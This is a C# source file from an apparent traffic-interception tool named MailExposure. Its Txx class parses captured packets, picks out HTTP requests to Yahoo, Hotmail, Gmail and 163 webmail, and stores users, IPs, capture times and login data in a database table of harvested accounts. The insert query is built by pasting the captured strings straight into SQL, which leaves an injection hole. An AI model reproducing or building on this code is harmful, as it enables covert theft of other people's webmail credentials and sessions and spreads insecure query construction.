using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

namespace MailExposure.PopMailRC
{
    class Txx
    {
        // Methods
        public Txx()
        { 
        }
        public void txxMessage(string strTxx)
        {
            int startIndex = 0;
            int index = 0;
            string str = "";
            mailMessage message = new mailMessage();
            startIndex = strTxx.IndexOf("ClientIp:");
            if (startIndex >= 0)
            {
                index = strTxx.IndexOf("\r\n", startIndex);
                if (index >= 0)
                {
                    str = strTxx.Substring(startIndex + 9, index - (startIndex + 9));
                    if (str.IndexOf("\n") == -1)
                    {
                        message.ClientIp = str;
                    }
                    else
                    {
                        message.ClientIp = str.Substring(0, str.IndexOf("\n"));
                    }
                }
            }
            startIndex = strTxx.IndexOf("ServerIp:");
            if (startIndex >= 0)
            {
                index = strTxx.IndexOf("\r\n", startIndex);
                if (index >= 0)
                {
                    str = strTxx.Substring(startIndex + 9, index - (startIndex + 9));
                    if (str.IndexOf("\n") == -1)
                    {
                        message.ServerIp = str;
                    }
                    else
                    {
                        message.ServerIp = str.Substring(0, str.IndexOf("\n"));
                    }
                }
            }
            startIndex = strTxx.IndexOf("Time:");
            if (startIndex >= 0)
            {
                index = strTxx.IndexOf("\r\n", startIndex);
                if (index >= 0)
                {
                    str = strTxx.Substring(startIndex + 6, index - (startIndex + 6));
                    if (str.IndexOf("\n") == -1)
                    {
                        message.Time = str;
                    }
                    else
                    {
                        message.Time = str.Substring(0, str.IndexOf("\n"));
                    }
                }
            }
            startIndex = strTxx.IndexOf("User:");
            if (startIndex >= 0)
            {
                index = strTxx.IndexOf("\r\n", startIndex);
                if (index >= 0)
                {
                    str = strTxx.Substring(startIndex + 6, index - (startIndex + 6));
                    if (str.IndexOf("\n") == -1)
                    {
                        message.User = str;
                    }
                    else
                    {
                        message.User = str.Substring(0, str.IndexOf("\n"));
                    }
                }
            }
            startIndex = strTxx.IndexOf("GET ");
            if (startIndex >= 0)
            {
                index = strTxx.IndexOf("\r\n\r\n", startIndex);
                if (index >= 0)
                {
                    str = strTxx.Substring(startIndex, index - startIndex);
                    message.msg = str;
                    if (message.msg.IndexOf("mail.yahoo.com") != -1)
                    {
                        message.type = "YAHOOMAIL";
                    }
                    else if (message.msg.IndexOf("mail.live.com") != -1)
                    {
                        message.type = "HOTMAIL";
                    }
                    else if (message.msg.IndexOf("mail.google.com") != -1)
                    {
                        message.type = "GMAIL";
                    }
                    else if (message.msg.IndexOf("163.com") != -1)
                    {
                        message.type = "163";
                    }
                }
            }
            if (message.type != "")
            {
                string str2 = "";
                string str3 = "";
                string str4 = "";
                string str5 = "";
                string str6 = "";
                string str7 = "";
                string str8 = "";
                try
                {
                    message.Time = DateTime.Parse(message.Time).ToString("yyyy-MM-dd HH:mm:ss");
                    str2 = "'" + message.type + "'";
                    str3 = "'" + message.ClientIp + "'";
                    str4 = "'" + message.ServerIp + "'";
                    str5 = "'" + message.User + "'";
                    str6 = "'" + message.Time + "'";
                    str7 = "'" + message.msg + "'";
                    str8 = "'TXX数据包'";
                    string strSql = "insert into users(用户名,密码类型,截取时间,源地址,目标地址,登陆信息,用户类型)values(" + str5 + "," + str2 + "," + str6 + "," + str3 + "," + str4 + "," + str7 + "," + str8 + ")";
                    GlobalValue.PopMainForm.ExecuteSQL(strSql);
                }
                catch (Exception exception)
                {
                    GlobalValue.PopMainForm.listBoxView.Items.Add("添加数据包失败！" + exception.Message);
                    GlobalValue.PopMainForm.listBoxView.SelectedIndex = GlobalValue.PopMainForm.listBoxView.Items.Count - 1;
                    return;
                }
                GlobalValue.PopMainForm.listBoxView.Items.Add("添加数据包:" + message.User);
                GlobalValue.PopMainForm.listBoxView.SelectedIndex = GlobalValue.PopMainForm.listBoxView.Items.Count - 1;
                int num3 = Convert.ToInt32(GlobalValue.PopMainForm.statusBarPanelThreadsText.Text) + 1;
                GlobalValue.PopMainForm.statusBarPanelThreadsText.Text = Convert.ToString(num3);
            }

        }

        // Nested Types
        [StructLayout(LayoutKind.Sequential)]
        public struct mailMessage
        {
            public string type;
            public string ClientIp;
            public string ServerIp;
            public string User;
            public string Time;
            public string msg;
        }

    }
}
